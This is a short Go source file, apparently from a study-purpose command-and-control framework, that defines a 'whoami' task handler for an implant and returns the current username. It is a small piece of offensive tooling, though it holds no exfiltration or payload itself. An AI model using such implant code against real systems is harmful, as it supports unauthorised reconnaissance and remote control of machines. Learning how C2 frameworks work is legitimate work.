package task

import (
	"os/user"
	
	"xhc2_for_studying/protocol"
)

func handleWhoami(task protocol.Task, implantID string) *protocol.TaskResult {
	currentUser, err := user.Current()
	if err != nil {
		return newFailedResult(task, implantID, err.Error())
	}
	return newSuccessResult(task, implantID, currentUser.Username)
}
